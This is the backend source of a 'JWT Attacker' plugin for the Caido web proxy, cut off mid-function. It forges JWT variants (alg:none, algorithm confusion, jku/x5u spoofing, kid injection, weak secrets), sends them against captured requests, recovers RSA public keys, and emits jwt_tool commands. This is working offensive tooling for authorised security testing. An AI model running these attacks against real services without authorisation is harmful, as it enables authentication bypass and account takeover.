import { SDK, DefineAPI, DefineEvents } from "caido:plugin";
import { RequestSpec } from "caido:utils";

import { parseJWT, getAlgorithmFamily, verifyRS256WithJWK } from "./crypto/jwt.js";
import { generateRSAKeyPair, buildJWKSDocument, type RSAKeyPair } from "./crypto/rsa.js";
import { recoverPublicKeyFromJWTs } from "./crypto/keyRecovery.js";
import { buildNoneAttacks } from "./attacks/none.js";
import { buildNullSigAttacks } from "./attacks/nullSig.js";
import { buildAlgConfusionAttacks, buildAlgConfusionForKeys } from "./attacks/algConfusion.js";
import { buildEmbeddedJWKAttacks } from "./attacks/embeddedJwk.js";
import { buildJKUSpoofAttacks, SPOOF_KID } from "./attacks/jkuSpoof.js";
import { buildKIDInjectionAttacks } from "./attacks/kidInject.js";
import { buildClaimTamperAttacks } from "./attacks/claimTamper.js";
import { buildWeakSecretAttacks } from "./attacks/weakSecret.js";
import { parseCookies, looksLikeJWT, nanoid } from "./util.js";
import { COMMON_JWKS_PATHS } from "./types.js";
import type {
  AttackResult,
  JwtLocation,
  ParsedJWT,
  PluginConfig,
} from "./types.js";

// Minimal interface matching the Caido RequestSpec surface we actually use
interface IRequestSpec {
  getHeaders(): Record<string, string[]>;
  getBody?(): { toText?(): string; toRaw?(): Uint8Array } | undefined;
  setHeader(name: string, value: string): void;
  setBody(body: string): void;
  getRaw(): unknown;
  getHost(): string;
  getPort(): number;
  getTls(): boolean;
}

// ─── Events emitted to frontend ────────────────────────────────────────────

export type BackendEvents = DefineEvents<{
  "jwt-attack-started": (data: { sessionId: string; requestId: string; total: number }) => void;
  "jwt-attack-result": (data: { sessionId: string; result: AttackResult }) => void;
  "jwt-attack-complete": (data: { sessionId: string; errors: string[] }) => void;
  "jwt-key-recovery-progress": (data: { sessionId: string; message: string }) => void;
  "jwt-key-recovery-complete": (data: { sessionId: string; keys: string[] }) => void;
  "jwks-spoof": (data: {
    sessionId: string;
    jwksJson: string;
    privateKeyPem: string;
    url: string;
    verifyStatus: "verified" | "mismatch" | "unreachable" | "no-url";
    verifyMessage: string;
    fetchedContent: string;
    selfVerified: boolean;
  }) => void;
  "jwks-found": (data: { sessionId: string; url: string; source: string; keyCount: number; content: string; pems: string[] }) => void;
}>;

// ─── RPC API exposed to frontend ────────────────────────────────────────────

async function attackJwt(
  sdk: SDK<API, BackendEvents>,
  requestId: string,
  config: PluginConfig
): Promise<{ sessionId: string }> {
  const sessionId = Math.random().toString(36).slice(2);
  const errors: string[] = [];

  sdk.console.log(`[JWT Attacker] attackJwt called: requestId=${requestId}`);

  // Run asynchronously so we can return the sessionId immediately
  (async () => {
    // Notify frontend immediately so the panel opens even if we abort early
    sdk.api.send("jwt-attack-started", { sessionId, requestId, total: 0 });

    // Fetch the original request
    const reqResp = await sdk.requests.get(requestId);
    if (!reqResp) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["Request not found"] });
      return;
    }

    const { request } = reqResp;
    const spec = request.toSpec() as unknown as IRequestSpec;

    // Find JWTs in the request
    const locations = findJWTsInSpec(spec);
    if (locations.length === 0) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["No JWT found in request (checked Authorization header, cookies, and JSON body)"] });
      return;
    }

    // Use the first JWT for now (UI can support multiple later)
    const loc = locations[0];
    const originalJWT = loc.jwt;

    let parsed: ParsedJWT;
    try {
      parsed = parseJWT(originalJWT);
    } catch (e) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: [`JWT parse failed: ${(e as Error).message}`] });
      return;
    }

    // ── Build all attack variants ──────────────────────────────────────────
    // The config can arrive partially serialized over RPC (e.g. a Vue reactive
    // proxy losing its nested `enabledAttacks`), so normalize defensively —
    // otherwise every `if (cfg.enabledAttacks.x)` would silently skip and we'd
    // build zero attacks.
    const cfg = normalizeConfig(config);
    sdk.console.log(
      `[JWT Attacker] enabled attacks: ${Object.entries(cfg.enabledAttacks)
        .filter(([, v]) => v)
        .map(([k]) => k)
        .join(", ") || "(none)"}`
    );

    // Generate one RSA key pair up front and reuse it for every JWK-injection
    // attack (embedded JWK + JKU/X5U). LLRT has no native key generation, so
    // this is a pure-BigInt operation — doing it once avoids repeating the cost.
    // (JKU/X5U spoofing uses the persisted spoof key pair from config instead.)
    let rsaKeyPair: RSAKeyPair | undefined;
    if (cfg.enabledAttacks.embeddedJwk) {
      try {
        sdk.api.send("jwt-key-recovery-progress", {
          sessionId,
          message: "Generating RSA key pair for the embedded-JWK attack…",
        });
        rsaKeyPair = generateRSAKeyPair(2048);
      } catch (e) {
        errors.push(`[keygen] ${(e as Error).message}`);
        sdk.console.log(`[JWT Attacker] RSA keygen failed: ${(e as Error).message}`);
      }
    }

    const attacks: AttackResult[] = [];

    const merge = (arr: AttackResult[]) => attacks.push(...arr);
    const tryMerge = async (name: string, fn: () => AttackResult[] | Promise<AttackResult[]>) => {
      try {
        merge(await fn());
      } catch (e) {
        errors.push(`[${name}] ${(e as Error).message}`);
        sdk.console.log(`[JWT Attacker] ${name} builder failed: ${(e as Error).message}`);
      }
    };

    if (cfg.enabledAttacks.none) await tryMerge("none", () => buildNoneAttacks(parsed));
    if (cfg.enabledAttacks.nullSig) await tryMerge("nullSig", () => buildNullSigAttacks(parsed));
    if (cfg.enabledAttacks.embeddedJwk) await tryMerge("embeddedJwk", () => buildEmbeddedJWKAttacks(parsed, rsaKeyPair));
    if (cfg.enabledAttacks.kidInject) await tryMerge("kidInject", () => buildKIDInjectionAttacks(parsed));
    if (cfg.enabledAttacks.claimTamper) await tryMerge("claimTamper", () => buildClaimTamperAttacks(parsed));

    if (cfg.enabledAttacks.weakSecret) {
      await tryMerge("weakSecret", () => buildWeakSecretAttacks(parsed, cfg, originalJWT));
    }

    // HTTP GET through Caido's own networking (handles self-signed certs,
    // upstream proxy, scope, and appears in HTTP history) — used for JWKS /
    // certificate discovery and for verifying the hosted spoofing JWKS. The LLRT
    // global `fetch` is unreliable for this and rejects invalid TLS certs.
    const httpGet = async (url: string): Promise<string> => {
      const getSpec = new RequestSpec(url);
      const sent = await sdk.requests.send(getSpec as unknown as Parameters<typeof sdk.requests.send>[0]);
      const code = sent.response?.getCode();
      if (!sent.response || code === undefined || code < 200 || code >= 300) {
        throw new Error(`HTTP ${code ?? "no response"}`);
      }
      const body = sent.response.getBody();
      return body ? bodyToText(body) : "";
    };

    if (cfg.enabledAttacks.jkuSpoof || cfg.enabledAttacks.x5uSpoof) {
      // Always sign with the PERSISTED spoofing key pair so the token matches the
      // jwks.json shown in (and hosted from) the Configuration pane.
      if (!cfg.spoofPrivateKeyPem || !cfg.spoofJwksJson) {
        errors.push(
          "[jkuSpoof] No spoofing key pair available — open the Configuration tab to " +
          "generate one (the signing key must match the hosted jwks.json)."
        );
      } else {
        try {
          const { attacks: spoofAttacks } = buildJKUSpoofAttacks(parsed, cfg);
          merge(spoofAttacks);

          // Self-check: does our signed jku token validate against the configured
          // (and hosted) JWKS public key? Proves the plugin's signing is correct.
          let selfVerified = false;
          try {
            const jwk = (JSON.parse(cfg.spoofJwksJson).keys ?? [])[0] as { n?: string; e?: string } | undefined;
            const jkuTok = spoofAttacks[0]?.modifiedJWT;
            if (jwk?.n && jwk?.e && jkuTok) {
              selfVerified = verifyRS256WithJWK(jkuTok, jwk.n, jwk.e);
            }
          } catch { /* leave false */ }
          if (!selfVerified) {
            errors.push("[jkuSpoof] Internal check failed: signed token did not validate against the configured JWKS.");
          }

          // Verify the JWKS actually hosted at the endpoint matches our key.
          let verifyStatus: "verified" | "mismatch" | "unreachable" | "no-url" = "no-url";
          let verifyMessage = "";
          let fetchedContent = "";
          if (!cfg.jwksUrl) {
            verifyStatus = "no-url";
            verifyMessage = "No JWKS Endpoint URL configured — a placeholder was used in the tokens. " +
              "Set the URL in Configuration and host the JWKS for a working test.";
            errors.push(`[jkuSpoof] ${verifyMessage}`);
          } else {
            try {
              fetchedContent = await httpGet(cfg.jwksUrl);
              if (jwksContainsKey(fetchedContent, cfg.spoofJwksJson)) {
                verifyStatus = "verified";
                verifyMessage = `The JWKS hosted at ${cfg.jwksUrl} matches the spoofing key (kid="${SPOOF_KID}"). ` +
                  "The jku/x5u tokens will validate against it.";
              } else {
                verifyStatus = "mismatch";
                verifyMessage = `The JWKS hosted at ${cfg.jwksUrl} does NOT contain the spoofing key (kid="${SPOOF_KID}"). ` +
                  "Re-host the jwks.json shown in the Configuration tab.";
                errors.push(`[jkuSpoof] ${verifyMessage}`);
              }
            } catch (e) {
              verifyStatus = "unreachable";
              verifyMessage = `Could not fetch the JWKS Endpoint URL (${cfg.jwksUrl}): ${(e as Error).message}. ` +
                "Ensure the jwks.json is hosted there and reachable from Caido.";
              errors.push(`[jkuSpoof] ${verifyMessage}`);
            }
          }

          sdk.api.send("jwks-spoof", {
            sessionId,
            jwksJson: cfg.spoofJwksJson,
            privateKeyPem: cfg.spoofPrivateKeyPem,
            url: cfg.jwksUrl || "(not configured)",
            verifyStatus,
            verifyMessage,
            fetchedContent: fetchedContent.slice(0, 8192),
            selfVerified,
          });
        } catch (e) {
          errors.push(`[jkuSpoof] ${(e as Error).message}`);
        }
      }
    }

    if (cfg.enabledAttacks.algConfusion) {
      const isAsym = /^(RS|PS|ES)/.test(parsed.header.alg as string);
      if (!isAsym) {
        sdk.api.send("jwt-key-recovery-progress", {
          sessionId,
          message: `Algorithm confusion skipped: token alg is ${parsed.header.alg} (only RS/PS/ES tokens can be downgraded to HMAC).`,
        });
      } else {
        sdk.api.send("jwt-key-recovery-progress", {
          sessionId,
          message: `Algorithm confusion: probing ${request.getHost()} for exposed JWKS & certificate key endpoints…`,
        });
        let foundCount = 0;
        await tryMerge("algConfusion", () => buildAlgConfusionAttacks(
          parsed,
          request.getHost(),
          request.getPort(),
          request.getTls(),
          cfg,
          [], // first wave: no recovered keys yet — recovery runs as a second wave below
          // Surface every discovered key source so the analyst doesn't miss it.
          (found) => { foundCount++; sdk.api.send("jwks-found", { sessionId, ...found }); },
          httpGet
        ));
        sdk.api.send("jwt-key-recovery-progress", {
          sessionId,
          message: foundCount > 0
            ? `Algorithm confusion: found ${foundCount} key endpoint(s) — see the cyan banner.`
            : `Algorithm confusion: no exposed JWKS/cert endpoints found on ${request.getHost()} (expected for "no exposed key" targets — use key recovery).`,
        });
      }
    }

    sdk.console.log(`[JWT Attacker] built ${attacks.length} attack variant(s)`);

    // Make the original token available on every attack so the UI can render
    // jwt_tool reproduction commands for each technique.
    for (const a of attacks) {
      if (!a.originalJWT) a.originalJWT = originalJWT;
    }

    // Baseline: the unmodified original request, sent first so the analyst has a
    // reference response (status / length) to compare every attack against.
    const baseline: AttackResult = {
      id: nanoid(),
      technique: "baseline",
      techniqueName: "Original request (baseline)",
      description: "The unmodified original request, sent first to establish a baseline response for comparison.",
      modifiedJWT: originalJWT,
      timestamp: Date.now(),
    };

    // Invalid signature: the original token with a corrupted signature, sent right
    // after the baseline as a known-bad reference. If the server still responds the
    // same as the baseline, it is not verifying the signature.
    // Replace the last 10 chars of the signature with 'A's. Flipping a single
    // trailing base64url char can leave the decoded signature bytes unchanged
    // (the last char often only carries padding bits), so it isn't guaranteed to
    // be rejected; overwriting 10 chars changes ~60 signature bits.
    const origSig = parsed.signatureB64;
    let corruptSig: string;
    if (origSig.length >= 10) {
      corruptSig = origSig.slice(0, -10) + "AAAAAAAAAA";
    } else if (origSig.length) {
      corruptSig = "A".repeat(origSig.length);
    } else {
      corruptSig = "aW52YWxpZHNpZ25hdHVyZQ";
    }
    // Guard against the (vanishingly unlikely) case the signature already ended in
    // those exact characters, which would leave it valid.
    if (corruptSig === origSig) {
      corruptSig = origSig.slice(0, -10) + "BBBBBBBBBB";
    }
    const invalidSig: AttackResult = {
      id: nanoid(),
      technique: "invalidSig",
      techniqueName: "Invalid signature (baseline failure)",
      description: "The original token with its signature corrupted — a known-bad request. " +
        "If this matches the baseline response, the server is not validating the JWT signature.",
      modifiedJWT: `${parsed.headerB64}.${parsed.payloadB64}.${corruptSig}`,
      timestamp: Date.now(),
    };

    // ── Send helper (reused for the first wave and the recovery second wave) ──
    // Captures the sent request/response per attack id (used for findings).
    const sentById = new Map<string, { request?: unknown; response?: unknown }>();
    const sendAttacks = async (list: AttackResult[]) => {
      for (const attack of list) {
        // Informational results (e.g. weak-secret "not found") are shown but not sent.
        if (attack.infoOnly) {
          sdk.api.send("jwt-attack-result", { sessionId, result: attack });
          continue;
        }
        try {
          const attackSpec = cloneSpecWithJWT(spec, loc, attack.modifiedJWT);
          const start = Date.now();
          const sent = await sdk.requests.send(attackSpec as unknown as Parameters<typeof sdk.requests.send>[0]);
          attack.durationMs = Date.now() - start;
          attack.requestId = sent.request?.getId();
          sentById.set(attack.id, { request: sent.request, response: sent.response });

          if (sent.response) {
            attack.responseStatus = sent.response.getCode();
            const body = sent.response.getBody();
            const bodyText = body ? await bodyToText(body) : "";
            attack.responseLength = bodyText.length;
            attack.responseBody = bodyText.slice(0, 4096); // truncate for UI
            attack.responseHeaders = flattenHeaders(sent.response.getHeaders());
          }
        } catch (e) {
          attack.error = (e as Error).message;
          errors.push(`[${attack.techniqueName}] ${attack.error}`);
        }
        sdk.api.send("jwt-attack-result", { sessionId, result: attack });
      }
    };

    // Collect key-recovery candidates from history BEFORE sending anything, so
    // this run's own forged tokens don't end up in the candidate set.
    let recoveryCandidates: ParsedJWT[] = [];
    if (cfg.enabledAttacks.algConfusion && cfg.enableKeyRecovery) {
      try {
        recoveryCandidates = await collectHistoryJWTs(sdk, request.getHost(), 50);
      } catch { /* non-fatal */ }
    }

    // ── First wave (baseline, then invalid-signature probe, then attacks) ─────
    const firstWave = [baseline, invalidSig, ...attacks];
    sdk.api.send("jwt-attack-started", { sessionId, requestId, total: firstWave.length });
    await sendAttacks(firstWave);

    // ── Signature-validation check: invalid-sig response vs baseline ──────────
    if (baseline.responseStatus !== undefined && invalidSig.responseStatus !== undefined) {
      const sameStatus = baseline.responseStatus === invalidSig.responseStatus;
      const bLen = baseline.responseLength ?? 0;
      const iLen = invalidSig.responseLength ?? 0;
      const lenClose = Math.abs(bLen - iLen) <= Math.max(32, Math.floor(bLen * 0.05));
      if (sameStatus && lenClose) {
        invalidSig.signatureNotValidated = true;
        invalidSig.description +=
          ` ⚠ Response matches the baseline (HTTP ${invalidSig.responseStatus}, ` +
          `~${iLen} bytes vs baseline ~${bLen} bytes) — the endpoint may NOT be validating the JWT signature.`;
        // Re-emit so the UI shows the warning.
        sdk.api.send("jwt-attack-result", { sessionId, result: invalidSig });

        // Raise a finding. The raw request/response are shown in Caido's
        // Request/Response pane (via the attached request), so the description is
        // just the markdown summary.
        try {
          const sent = sentById.get(invalidSig.id) as
            | { request?: { getHost(): string; getPath(): string } }
            | undefined;
          if (sent?.request) {
            await sdk.findings.create({
              title: "Endpoint may not validate JWT signature",
              reporter: "JWT Attacker",
              dedupeKey: `jwt-attacker:no-sig-validation:${sent.request.getHost()}${sent.request.getPath()}`,
              request: sent.request as unknown as Parameters<typeof sdk.findings.create>[0]["request"],
              description:
                "**The endpoint does not appear to validate the JWT signature.**\n\n" +
                "A request carrying a JWT whose signature was deliberately corrupted returned the same " +
                `response as the unmodified token (HTTP ${invalidSig.responseStatus}, ~${iLen} bytes vs ` +
                `baseline ~${bLen} bytes). The endpoint likely does not verify the JWT signature, so forged ` +
                "or tampered tokens (e.g. with elevated claims) would be accepted.",
            });
            sdk.api.send("jwt-key-recovery-progress", {
              sessionId,
              message: 'Finding created: "Endpoint may not validate JWT signature".',
            });
          }
        } catch (e) {
          errors.push(`[finding] ${(e as Error).message}`);
        }
      }
    }

    // ── Successful-bypass findings ────────────────────────────────────────────
    // Only meaningful when the server DID reject the invalid signature (baseline
    // and invalid-sig differ). In that case, any attack whose response matches the
    // baseline means its forged token was ACCEPTED — a real signature bypass.
    const sigValidated =
      baseline.responseStatus !== undefined &&
      invalidSig.responseStatus !== undefined &&
      !invalidSig.signatureNotValidated;

    const matchesBaseline = (a: AttackResult): boolean =>
      a.responseStatus !== undefined &&
      a.responseStatus === baseline.responseStatus &&
      Math.abs((a.responseLength ?? 0) - (baseline.responseLength ?? 0)) <=
        Math.max(32, Math.floor((baseline.responseLength ?? 0) * 0.05));

    const createBypassFinding = async (a: AttackResult): Promise<void> => {
      const sent = sentById.get(a.id) as
        | { request?: { getHost(): string; getPath(): string } }
        | undefined;
      if (!sent?.request) return;
      const title = BYPASS_TITLES[a.technique] ?? `JWT forged token accepted (${a.technique})`;
      const repro = buildReproCommand(a);
      try {
        await sdk.findings.create({
          title,
          reporter: "JWT Attacker",
          dedupeKey: `jwt-attacker:bypass:${a.technique}:${sent.request.getHost()}${sent.request.getPath()}`,
          request: sent.request as unknown as Parameters<typeof sdk.findings.create>[0]["request"],
          description:
            `**${title}.**\n\n` +
            `A forged token (${a.techniqueName}) was accepted: its response matched the baseline ` +
            `(HTTP ${a.responseStatus}, ~${a.responseLength} bytes), while a token with an invalid ` +
            `signature was rejected — confirming the bypass works.` +
            (repro ? `\n\n**Reproduce with jwt_tool:**\n\n\`\`\`\n${repro}\n\`\`\`` : ""),
        });
      } catch (e) {
        errors.push(`[finding] ${(e as Error).message}`);
      }
    };

    const runBypassFindings = async (list: AttackResult[]): Promise<void> => {
      if (!sigValidated) return;
      for (const a of list) {
        if (a.infoOnly || a.error) continue;
        if (matchesBaseline(a)) await createBypassFinding(a);
      }
    };

    await runBypassFindings(attacks);

    // ── Second wave: RSA public-key recovery from same-host HTTP history ──────
    // Requires 2+ distinct RS/PS JWTs from the same host. The recovery math
    // (sig^65537 over the integers) is heavy and pure-JS BigInt lacks GMP-grade
    // performance, so it is opt-in (cfg.enableKeyRecovery) and runs only after
    // the main attacks have already been sent.
    if (cfg.enabledAttacks.algConfusion && cfg.enableKeyRecovery) {
      const host = request.getHost();
      const historyJWTs = recoveryCandidates;
      const fullTok = (j: ParsedJWT) => `${j.headerB64}.${j.payloadB64}.${j.signatureB64}`;
      // External fallback: rsa_sign2n (GMP-backed) recovers in seconds where the
      // in-browser O(n²) GCD can't. Shown whenever in-runtime recovery doesn't win.
      const emitExternalHint = () => {
        if (historyJWTs.length >= 2) {
          sdk.api.send("jwt-key-recovery-progress", {
            sessionId,
            message: `For fast recovery run rsa_sign2n externally:  python3 jwt_forgery.py "${fullTok(historyJWTs[0])}" "${fullTok(historyJWTs[1])}"  — then paste the recovered public key into Configuration → Public Key and re-run with Algorithm Confusion.`,
          });
        }
      };
      try {
        sdk.api.send("jwt-key-recovery-progress", {
          sessionId,
          message: `Key recovery: scanned HTTP history of ${host} — found ${historyJWTs.length} distinct RS/PS JWT(s).`,
        });
        if (historyJWTs.length < 2) {
          sdk.api.send("jwt-key-recovery-progress", {
            sessionId,
            message: "Key recovery needs ≥2 DISTINCT same-host RS/PS JWTs (different signatures, same key). " +
              "Capture more (e.g. log in again so the app issues a second token), then re-run. Skipping recovery.",
          });
        } else {
          sdk.api.send("jwt-key-recovery-progress", {
            sessionId,
            message: "Attempting public-key recovery (e=3 is fast; e=65537 runs under a ~4-minute budget and aborts if it can't finish — it's O(n²) without GMP)…",
          });
          const keyResults = await recoverPublicKeyFromJWTs(
            historyJWTs,
            (msg) => sdk.api.send("jwt-key-recovery-progress", { sessionId, message: msg })
          );
          const recoveredKeys = keyResults.map((r) => r.publicKeyPem);
          if (recoveredKeys.length) {
            sdk.api.send("jwt-key-recovery-complete", { sessionId, keys: recoveredKeys });
            const extra = buildAlgConfusionForKeys(parsed, recoveredKeys, "recovered from HTTP history");
            if (extra.length) {
              for (const a of extra) if (!a.originalJWT) a.originalJWT = originalJWT;
              attacks.push(...extra);
              // +2 accounts for the baseline + invalid-signature probes already sent.
              sdk.api.send("jwt-attack-started", { sessionId, requestId, total: attacks.length + 2 });
              await sendAttacks(extra);
              await runBypassFindings(extra);
            }
          } else {
            sdk.api.send("jwt-key-recovery-progress", {
              sessionId,
              message: "In-browser recovery did not finish (e=65537 is too slow here).",
            });
            emitExternalHint();
          }
        }
      } catch (e) {
        sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `Key recovery stopped: ${(e as Error).message}.` });
        emitExternalHint();
        sdk.console.log(`[JWT Attacker] key recovery failed: ${(e as Error).message}`);
      }
    }

    if (attacks.length === 0) {
      errors.push("No attack variants were generated — check that at least one attack is enabled in Configuration.");
    }

    sdk.api.send("jwt-attack-complete", { sessionId, errors });
  })().catch((e) => {
    sdk.api.send("jwt-attack-complete", { sessionId, errors: [(e as Error).message] });
  });

  return { sessionId };
}

async function getJWTsInRequest(
  sdk: SDK<API, BackendEvents>,
  requestId: string
): Promise<JwtLocation[]> {
  const reqResp = await sdk.requests.get(requestId);
  if (!reqResp) return [];
  return findJWTsInSpec(reqResp.request.toSpec() as unknown as IRequestSpec);
}

// Generate a fresh RSA spoofing key pair and the matching JWKS document to host.
// The private key signs spoofed (jku/x5u) tokens; the JWKS exposes the public
// key under SPOOF_KID, so the two are guaranteed consistent.
async function generateSpoofKeyPair(
  _sdk: SDK<API, BackendEvents>
): Promise<{ privateKeyPem: string; jwksJson: string }> {
  const kp = generateRSAKeyPair(2048);
  const jwks = buildJWKSDocument({ ...kp.publicJwk, kid: SPOOF_KID }, SPOOF_KID);
  return { privateKeyPem: kp.privateKeyPem, jwksJson: JSON.stringify(jwks, null, 2) };
}

// ─── Helpers ────────────────────────────────────────────────────────────────

// Does the hosted JWKS contain the exact public key from our configured JWKS?
function jwksContainsKey(hostedRaw: string, expectedRaw: string): boolean {
  try {
    const hosted = JSON.parse(hostedRaw) as { keys?: Array<Record<string, unknown>> };
    const expected = JSON.parse(expectedRaw) as { keys?: Array<Record<string, unknown>> };
    const exp = expected.keys?.[0];
    if (!exp) return false;
    return (hosted.keys ?? []).some(
      (k) => k.kty === exp.kty && k.n === exp.n && k.e === exp.e && k.kid === exp.kid
    );
  } catch {
    return false;
  }
}

// Title used for the "forged token accepted" finding, per technique.
const BYPASS_TITLES: Record<string, string> = {
  none: "JWT 'alg:none' accepted (signature stripped)",
  nullSig: "JWT with null signature accepted",
  algConfusion: "JWT algorithm confusion (RS→HS) accepted",
  embeddedJwk: "JWT embedded JWK (CVE-2018-0114) accepted",
  jkuSpoof: "JWT 'jku' header spoofing accepted",
  x5uSpoof: "JWT 'x5u' header spoofing accepted",
  kidInject: "JWT 'kid' header injection accepted",
  claimTamper: "JWT claim tampering accepted (signature not enforced)",
  weakSecret: "JWT signed with weak/guessable secret accepted",
};

// base64-encode the key PEM the way the matching algorithm-confusion secret was
// derived (mirrors the frontend jwt_tool repro logic).
function secretBase64(pem: string, encoding: string): string {
  const norm = pem.replace(/\r\n/g, "\n");
  switch (encoding) {
    case "PEM (no trailing LF)": return Buffer.from(norm.replace(/\n+$/, ""), "utf8").toString("base64");
    case "base64(PEM)": return Buffer.from(Buffer.from(norm, "utf8").toString("base64"), "utf8").toString("base64");
    case "DER": return norm.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
    case "PEM":
    default: return Buffer.from(norm, "utf8").toString("base64");
  }
}

// Build the jwt_tool reproduction command(s) for a result (backend mirror of the
// frontend "REPRODUCE WITH JWT_TOOL" section) so findings can embed them.
function buildReproCommand(r: AttackResult): string | undefined {
  if (!r.originalJWT) return undefined;
  const J = "python3 jwt_tool.py";
  const orig = `'${r.originalJWT}'`;
  let modHeader: Record<string, unknown> = {};
  try { modHeader = parseJWT(r.modifiedJWT).header as Record<string, unknown>; } catch { /* ignore */ }
  switch (r.technique) {
    case "algConfusion": {
      if (!r.keyPem) return undefined;
      const b64 = secretBase64(r.keyPem, r.secretEncoding ?? "PEM");
      return `echo -n '${b64}' | base64 -d > /tmp/jwt_pubkey\n${J} ${orig} -X k -pk /tmp/jwt_pubkey`;
    }
    case "none": return `${J} ${orig} -X a`;
    case "nullSig": return `${J} ${orig} -X n`;
    case "embeddedJwk": return `${J} ${orig} -X i`;
    case "jkuSpoof":
    case "x5uSpoof": {
      const claim = r.technique === "x5uSpoof" ? "x5u" : "jku";
      const url = typeof modHeader[claim] === "string" ? (modHeader[claim] as string) : "<your-jwks-url>";
      const kid = typeof modHeader.kid === "string" ? (modHeader.kid as string) : "jwt-attacker-spoof-key";
      if (!r.signingKeyPem) return `${J} ${orig} -X s -ju '${url}'`;
      const keyB64 = Buffer.from(r.signingKeyPem, "utf8").toString("base64");
      return `echo -n '${keyB64}' | base64 -d > /tmp/priv.key\n${J} ${orig} -I -hc ${claim} -hv '${url}' -hc kid -hv '${kid}' -S rs256 -pr /tmp/priv.key`;
    }
    case "kidInject": {
      const kid = typeof modHeader.kid === "string" ? (modHeader.kid as string) : "";
      return `${J} ${orig} -I -hc kid -hv '${kid}' -S hs256 -p '${r.hmacSecret ?? ""}'`;
    }
    case "weakSecret": {
      const hsAlg = (typeof modHeader.alg === "string" ? (modHeader.alg as string) : "HS256").toLowerCase();
      if (r.hmacSecret === undefined) return `${J} ${orig} -C -d /path/to/jwt.secrets.list`;
      return `${J} ${orig} -C -d /path/to/jwt.secrets.list\n${J} ${orig} -S ${hsAlg} -p '${r.hmacSecret}'`;
    }
    case "claimTamper": {
      let origP: Record<string, unknown> = {};
      let modP: Record<string, unknown> = {};
      try { origP = parseJWT(r.originalJWT).payload; } catch { /* ignore */ }
      try { modP = parseJWT(r.modifiedJWT).payload; } catch { /* ignore */ }
      const pairs: string[] = [];
      for (const k of Object.keys(modP)) {
        if (JSON.stringify(modP[k]) !== JSON.stringify(origP[k])) {
          const v = typeof modP[k] === "string" ? (modP[k] as string) : JSON.stringify(modP[k]);
          pairs.push(`-pc ${k} -pv '${v}'`);
        }
      }
      return pairs.length ? `${J} ${orig} -I ${pairs.join(" ")}` : undefined;
    }
    default: return undefined;
  }
}

const ALL_ATTACKS = [
  "none", "nullSig", "algConfusion", "embeddedJwk", "jkuSpoof",
  "x5uSpoof", "kidInject", "claimTamper", "weakSecret",
] as const;

// The config may arrive over RPC as a reactive proxy, a partial object, or even
// undefined. Rebuild a plain, fully-populated PluginConfig so downstream code
// can rely on its shape. If no attack flags survived, default them all to on.
function normalizeConfig(raw: unknown): PluginConfig {
  const c = (raw && typeof raw === "object" ? raw : {}) as Partial<PluginConfig>;
  const rawEnabled = (c.enabledAttacks && typeof c.enabledAttacks === "object"
    ? c.enabledAttacks
    : {}) as Record<string, unknown>;

  const hasAnyFlag = ALL_ATTACKS.some((k) => typeof rawEnabled[k] === "boolean");
  const enabledAttacks: Record<string, boolean> = {};
  for (const k of ALL_ATTACKS) {
    enabledAttacks[k] = hasAnyFlag ? rawEnabled[k] === true : true;
  }

  return {
    jwksUrl: typeof c.jwksUrl === "string" ? c.jwksUrl : "",
    customPublicKeyPem: typeof c.customPublicKeyPem === "string" ? c.customPublicKeyPem : "",
    customPrivateKeyPem: typeof c.customPrivateKeyPem === "string" ? c.customPrivateKeyPem : "",
    customCertPem: typeof c.customCertPem === "string" ? c.customCertPem : "",
    jwksPaths: Array.isArray(c.jwksPaths) && c.jwksPaths.length ? c.jwksPaths : [...COMMON_JWKS_PATHS],
    customWordlist: Array.isArray(c.customWordlist) ? c.customWordlist : [],
    spoofPrivateKeyPem: typeof c.spoofPrivateKeyPem === "string" ? c.spoofPrivateKeyPem : "",
    spoofJwksJson: typeof c.spoofJwksJson === "string" ? c.spoofJwksJson : "",
    enableKeyRecovery: c.enableKeyRecovery === true,
    enabledAttacks,
  };
}

function findJWTsInSpec(spec: IRequestSpec): JwtLocation[] {
  const locations: JwtLocation[] = [];

  const headers = spec.getHeaders() as Record<string, string[]>;

  // Authorization: Bearer <jwt>
  const authVals: string[] = headers["authorization"] ?? headers["Authorization"] ?? [];
  for (const val of authVals) {
    const match = val.match(/^(Bearer\s+)(.+)$/i);
    if (match && looksLikeJWT(match[2])) {
      locations.push({ type: "header", headerName: "Authorization", prefix: match[1], jwt: match[2] });
    } else if (looksLikeJWT(val)) {
      locations.push({ type: "header", headerName: "Authorization", prefix: "", jwt: val });
    }
  }

  // Cookie header
  const cookieVals: string[] = headers["cookie"] ?? headers["Cookie"] ?? [];
  for (const cookieStr of cookieVals) {
    const cookies = parseCookies(cookieStr);
    for (const [name, value] of Object.entries(cookies)) {
      if (looksLikeJWT(value)) {
        locations.push({ type: "cookie", cookieName: name, jwt: value });
      }
    }
  }

  // Custom JWT headers
  for (const name of ["X-Auth-Token", "X-Access-Token", "X-JWT-Token", "Token"]) {
    const vals: string[] = headers[name.toLowerCase()] ?? headers[name] ?? [];
    for (const val of vals) {
      if (looksLikeJWT(val)) {
        locations.push({ type: "header", headerName: name, prefix: "", jwt: val });
      }
    }
  }

  // JSON body
  const body = spec.getBody?.();
  if (body) {
    try {
      const text = typeof body.toText === "function" ? body.toText() : body.toString();
      const json = JSON.parse(text) as Record<string, unknown>;
      for (const key of ["token", "access_token", "id_token", "jwt", "auth_token", "refresh_token"]) {
        if (typeof json[key] === "string" && looksLikeJWT(json[key] as string)) {
          locations.push({ type: "body-json", jsonKey: key, jwt: json[key] as string });
        }
      }
    } catch { /* ignore */ }
  }

  return locations;
}

function cloneSpecWithJWT(
  original: IRequestSpec,
  loc: JwtLocation,
  newJWT: string
): IRequestSpec {
  const clone = RequestSpec.parse(original.getRaw() as Parameters<typeof RequestSpec.parse>[0]) as unknown as IRequestSpec;

  if (loc.type === "header" && loc.headerName) {
    clone.setHeader(loc.headerName, `${loc.prefix ?? ""}${newJWT}`);
  } else if (loc.type === "cookie" && loc.cookieName) {
    const headers = clone.getHeaders() as Record<string, string[]>;
    const cookieVals: string[] = headers["cookie"] ?? headers["Cookie"] ?? [];
    const cookieStr = cookieVals[0] ?? "";
    const cookies = parseCookies(cookieStr);
    cookies[loc.cookieName] = newJWT;
    const newCookie = Object.entries(cookies)
      .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
      .join("; ");
